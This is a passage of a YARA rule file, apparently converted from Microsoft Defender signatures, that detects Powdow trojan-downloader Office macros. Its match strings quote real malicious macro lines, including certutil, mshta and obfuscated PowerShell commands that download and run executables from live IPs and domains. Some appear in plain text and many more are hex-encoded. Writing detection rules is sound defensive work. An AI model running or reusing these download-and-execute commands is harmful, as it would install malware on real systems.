        $x_1_2 = {66 73 20 3d 20 64 6f 67 65 28 30 2c 20 53 74 72 43 6f 6e 76 28 22 6f 70 65 6e 22 2c 20 36 34 29 2c 20 53 74 72 43 6f 6e 76 28 22 65 78 70 6c 22 20 26 20 43 68 72 28 31 31 31 29 20 26 20 22 72 65 72 22 2c 20 36 34 29 2c 20 53 74 72 43 6f 6e 76 28 [0-20] 2c 20 36 34 29 2c 20 22 22 2c 20 31 29 0d 0a 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVAP_2147813731_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVAP!MTB"
        threat_id = "2147813731"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {47 65 74 4f 62 6a 65 63 74 20 5f 0d 0a 28 62 65 61 63 68 29 0d 0a 68 6f 74 65 6c 20 5f}  //weight: 1, accuracy: High
        $x_1_2 = "copyfile computeroo1, collegeoo4, True" ascii //weight: 1
        $x_1_3 = "SReverseMod & StrReverse(Mid(flx698whs, AcS65SaqF, 2))" ascii //weight: 1
        $x_1_4 = {47 65 74 4f 62 6a 65 63 74 28 62 75 73 29 2e 20 5f 0d 0a 47 65 74 28 61 69 72 70 6c 61 6e 65 29 2e 20 5f 0d 0a 43 72 65 61 74 65 20 5f 0d 0a 63 61 72 2c 20 5f}  //weight: 1, accuracy: High
        $x_1_5 = "Auto_Open()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVAP_2147813731_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVAP!MTB"
        threat_id = "2147813731"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 53 68 65 6c 6c 28 22 63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 3a 2f 2f 31 33 2e 32 33 31 2e 32 33 38 2e 31 32 2f 62 6f 61 72 64 2f [0-25] 22 22 20 [0-25] 2e 65 78 65 2e 65 78 65 20 26 26 20 01 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 53 68 65 6c 6c 28 22 63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 3a 2f 2f 33 2e 37 30 2e 32 34 37 2e 32 32 39 2f 63 6c 61 73 73 2f 6c 6f 61 64 65 72 2f [0-25] 22 22 20 [0-25] 2e 65 78 65 2e 65 78 65 20 26 26 20 [0-25] 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 53 68 65 6c 6c 28 22 63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 3a 2f 2f 32 30 2e 32 32 32 2e 35 30 2e 31 33 34 2f 6a 76 2f 6c 6f 61 64 65 72 2f [0-25] 22 22 20 [0-25] 2e 65 78 65 2e 65 78 65 20 26 26 20 [0-25] 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 53 68 65 6c 6c 28 22 63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 73 3a 2f 2f 63 64 6e 2e 64 69 73 63 6f 72 64 61 70 70 2e 63 6f 6d 2f 61 74 74 61 63 68 6d 65 6e 74 73 2f 39 36 35 36 33 33 34 38 33 36 38 39 30 35 38 33 30 34 2f 39 37 33 30 30 34 34 36 34 35 33 39 37 31 33 35 36 36 2f [0-25] 22 22 20 [0-25] 2e 65 78 65 2e 65 78 65 20 26 26 20 [0-25] 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
        $x_1_5 = {3d 20 53 68 65 6c 6c 28 22 63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 3a 2f 2f 64 75 62 69 62 72 61 73 2e 63 6f 6d 2e 62 72 2f 70 72 69 76 5f 73 79 6d 2f [0-25] 22 22 20 [0-25] 2e 65 78 65 2e 65 78 65 20 26 26 20 [0-25] 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
        $x_1_6 = {3d 20 53 68 65 6c 6c 28 22 63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 73 3a 2f 2f 63 64 6e 2e 64 69 73 63 6f 72 64 61 70 70 2e 63 6f 6d 2f 61 74 74 61 63 68 6d 65 6e 74 73 2f 31 30 30 36 38 32 32 35 36 31 37 30 39 30 34 37 38 36 31 2f 31 30 30 38 35 38 33 38 30 39 32 34 35 31 32 36 37 30 38 2f [0-25] 22 22 20 [0-25] 2e 65 78 65 2e 65 78 65 20 26 26 20 [0-25] 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Powdow_PDZ_2147813771_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.PDZ!MTB"
        threat_id = "2147813771"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 53 68 65 6c 6c 28 22 63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 3a 2f 2f 31 33 2e 32 33 31 2e 32 33 38 2e 31 32 2f [0-10] 2f [0-32] 2e 62 61 74 22}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 65 78 65 2e 65 78 65 20 26 26 20 [0-31] 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_APD_2147814013_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.APD!MTB"
        threat_id = "2147814013"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 53 68 65 6c 6c 28 22 63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 3a 2f 2f 31 38 2e 31 39 33 2e 31 30 32 2e 32 33 32 2f 64 65 2f [0-32] 2e 62 61 74 22}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 65 78 65 2e 65 78 65 20 26 26 20 [0-31] 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_BPD_2147814266_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.BPD!MTB"
        threat_id = "2147814266"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 53 68 65 6c 6c 28 22 63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 3a 2f 2f 31 33 2e 31 31 32 2e 32 33 33 2e 31 39 39 2f 73 68 61 72 65 2f [0-24] 2e 62 61 74 22}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 65 78 65 2e 65 78 65 20 26 26 20 [0-31] 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVBA_2147814445_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVBA!MTB"
        threat_id = "2147814445"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ".Run(\"certutil -decode C:\\ProgramData\\~djXsfwEF.txt C:\\ProgramData\\~djXsfwEF.vbe\", 0," ascii //weight: 1
        $x_1_2 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 57 53 63 72 69 70 74 2e 53 68 65 6c 6c 22 29 0d 0a 27 57 73 68 53 68 65 6c 6c 2e 52 75 6e 20 28 67 74 33 29 2c 20 30}  //weight: 1, accuracy: High
        $x_1_3 = "ts.WriteLine \"PT1eI35A=\"" ascii //weight: 1
        $x_1_4 = "document_open()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_PRA_2147814484_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.PRA!MTB"
        threat_id = "2147814484"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "kaosk.copyfile \"C:\\Windows\\System32\\mshta.exe\", \"C:\\\\ProgramData\\\\cond.com\", True" ascii //weight: 1
        $x_1_2 = "= \"C:mmmmmmmmDLASDLlrogramDatammmmmmmmcond0lol hmotamotaDLASDLls:sexsexmislalmislalmislal0bimotaly0lolsex\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_PRC_2147814485_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.PRC!MTB"
        threat_id = "2147814485"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= CreateObject(\"Scripting.FileSystemObject\")" ascii //weight: 1
        $x_1_2 = "objFSO.CreateTextFile(\"C:\\programdata\\ok.ps1\")" ascii //weight: 1
        $x_1_3 = "ObjFile.Write (\"(.('Ne'+('w-'+'Ob')+('j'+'ect'))" ascii //weight: 1
        $x_1_4 = "n`Et.w`EB`CLieNt).\"\"DOw`NL`Oads`TRI`Ng\"\"(('ht'+'tps'+'://pastebin.com/raw'+'/'+'WNJ'+'D'+'5X'+'R'+'v'))|.( " ascii //weight: 1
        $x_1_5 = "([String]''.\"\"iSn`ORM`AlIZed\"\")[5,36,48]-Join'')\")" ascii //weight: 1
        $x_1_6 = "=EXEC(\"\"cmd /c p^owersh^el^l C:\\Programdata\\ok.ps1\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_PRF_2147814486_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.PRF!MTB"
        threat_id = "2147814486"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Shell(\"cmd.exe /S /c\" & \"mshta.exe http://185.48.64.160:8080/yqF0Wa42iS.hta\", vbNormalFocus)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_CPD_2147814502_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.CPD!MTB"
        threat_id = "2147814502"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= Shell(\"cmd /c certutil.exe -urlcache -split -f \"\"https://transfer.sh/get/YkrwJh/RF_60213_3780_105.bat\"" ascii //weight: 1
        $x_1_2 = {2e 65 78 65 2e 65 78 65 20 26 26 20 [0-37] 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_DPD_2147814750_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.DPD!MTB"
        threat_id = "2147814750"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= Shell(\"cmd /c certutil.exe -urlcache -split -f \"\"http://185.222.58.56/00.exe\"" ascii //weight: 1
        $x_1_2 = {2e 65 78 65 2e 65 78 65 20 26 26 20 [0-15] 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_DPD_2147814750_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.DPD!MTB"
        threat_id = "2147814750"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 71 71 71 78 78 78 2e 69 74 73 6f 6e 65 2b 69 68 74 2e 6f 70 65 6e 73 68 69 74 6d 73 67 62 6f 78 22 6f 66 66 69 63 65 65 72 72 6f 72 21 21 21 22 3a 5f 63 61 6c 6c 73 68 65 6c 6c [0-1] 28 62 72 6f 6b 65 6e 73 68 6f 77 6f 66 66 29 65 6e 64 66 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_2 = "=ght.elephant_+llt.loratwo=llt.k+llt.t_+llt.xtthree=one_+twoopenshit=threeendfunction" ascii //weight: 1
        $x_1_3 = "=surething.multi.tagendfunctionfunctionyt()" ascii //weight: 1
        $x_1_4 = "=hqt.xy+hqt.yttwoway=hqt.z+hqt.dfeitsone=oneway+twowayendfunction" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SHS_2147814871_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SHS!MTB"
        threat_id = "2147814871"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "\"shell32.dll\" Alias \"ShellExecuteA\" (" ascii //weight: 1
        $x_1_2 = "(1, StrReverse(\"nepO\"), StrReverse(\"exe.llehsrewop\"), StrReverse(\" sbv.enoD exe.rerolpxe;sbv.enoD o- sbv.suriv_krad/lapyap/191.811.052.612 tegw neddiH elytSwodniW- \")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SHS_2147814871_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SHS!MTB"
        threat_id = "2147814871"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 56 42 41 2e 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-31] 28 22 [0-47] 22 29 20 26 20 [0-31] 28 22 [0-47] 22 29 29}  //weight: 1, accuracy: Low
        $x_1_2 = ".ExpandEnvironmentStrings(\"%TEMP%\") & \"\\cym_16001380430BD84B24.exe\"" ascii //weight: 1
        $x_1_3 = "objShell.Run (Named)" ascii //weight: 1
        $x_1_4 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-31] 28 22 [0-47] 22 29 20 26 20 [0-31] 28 22 [0-47] 22 29 29}  //weight: 1, accuracy: Low
        $x_1_5 = {2e 63 72 65 61 74 65 45 6c 65 6d 65 6e 74 28 [0-31] 28 22 [0-47] 22 29 29}  //weight: 1, accuracy: Low
        $x_1_6 = {45 4c 2e 44 61 74 61 54 79 70 65 20 3d 20 [0-31] 28 22 [0-47] 22 29 20 26 20 [0-31] 28 22 [0-47] 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_EPD_2147814938_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.EPD!MTB"
        threat_id = "2147814938"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= Shell(\"cmd /c certutil.exe -urlcache -split -f \"\"http://bitcoin-miner.top/apl/mscalc.exe\"" ascii //weight: 1
        $x_1_2 = {2e 65 78 65 2e 65 78 65 20 26 26 20 [0-15] 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_FPD_2147814939_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.FPD!MTB"
        threat_id = "2147814939"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= Shell(\"cmd /c certutil.exe -urlcache -split -f \"\"http://toyscenter.cl/wp-includes/vin/Yulzhnhjr.exe\"" ascii //weight: 1
        $x_1_2 = {2e 65 78 65 2e 65 78 65 20 26 26 20 [0-31] 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_GPD_2147815122_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.GPD!MTB"
        threat_id = "2147815122"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 53 68 65 6c 6c 28 22 63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 3a 2f 2f 33 2e 37 31 2e 33 39 2e 32 32 34 2f 30 63 2f 6c 6f 61 64 65 72 2f 75 70 6c 6f 61 64 73 2f [0-32] 2e 62 61 74 22}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 65 78 65 2e 65 78 65 20 26 26 20 [0-31] 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_HPD_2147815170_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.HPD!MTB"
        threat_id = "2147815170"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "StrReverse(\"nepO\"), StrReverse(\"exe.llehsrewop\"), StrReverse(\" sbv.ariexiL exe.rerolpxe;sbv.ariexiL o- L7ih3D3/yl.tib tegw neddiH elytSwodniW- \"))" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_IPD_2147815216_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.IPD!MTB"
        threat_id = "2147815216"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= Shell(\"cmd /c certutil.exe -urlcache -split -f \"\"http://3.71.39.224/peace/loader/uploads/BL60174100032.exe\"" ascii //weight: 1
        $x_1_2 = {2e 65 78 65 2e 65 78 65 20 26 26 20 [0-15] 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_JPD_2147815327_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.JPD!MTB"
        threat_id = "2147815327"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= Shell(\"cmd /c certutil.exe -urlcache -split -f \"\"https://richmox.xyz/cn/Mhaedjy.exe\"" ascii //weight: 1
        $x_1_2 = {2e 65 78 65 2e 65 78 65 20 26 26 20 [0-31] 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_KPD_2147815405_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.KPD!MTB"
        threat_id = "2147815405"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= Shell(\"cmd /c certutil.exe -urlcache -split -f \"\"http://18.179.111.240/gt1/loader/uploads/NewPO.exe\"" ascii //weight: 1
        $x_1_2 = {2e 65 78 65 2e 65 78 65 20 26 26 20 [0-37] 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVAQ_2147815569_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVAQ!MTB"
        threat_id = "2147815569"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= CreateObject(\"WScript.Shell\")" ascii //weight: 1
        $x_1_2 = {2e 4f 70 65 6e 20 22 67 65 74 22 2c 20 [0-100] 28 22 68 ?? ?? ?? ?? 3a 2f 2f 77 77 77 [0-130] 22 29 2c 20 46 61 6c 73 65}  //weight: 1, accuracy: Low
        $x_1_3 = {49 6e 53 74 72 28 [0-100] 2c 20 4d 69 64 28 [0-100] 2c 20 74 2c 20 31 29 29}  //weight: 1, accuracy: Low
        $x_1_4 = "= Chr(50) + Chr(48) + Chr(48)" ascii //weight: 1
        $x_1_5 = {52 61 6e 67 65 28 22 41 ?? 32 22 29 2e 56 61 6c 75 65 20 3d 20 22 67 78 64 66 67 73 66 67 68 73 20 78 68 66 78 68 20 73 68 73 67 68 73 20 22}  //weight: 1, accuracy: Low
        $x_1_6 = {3d 20 57 73 68 53 68 65 6c 6c 2e 53 70 65 63 69 61 6c 46 6f 6c 64 65 72 73 28 22 [0-8] 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (5 of ($x*))
}

rule TrojanDownloader_O97M_Powdow_LPD_2147815767_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.LPD!MTB"
        threat_id = "2147815767"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
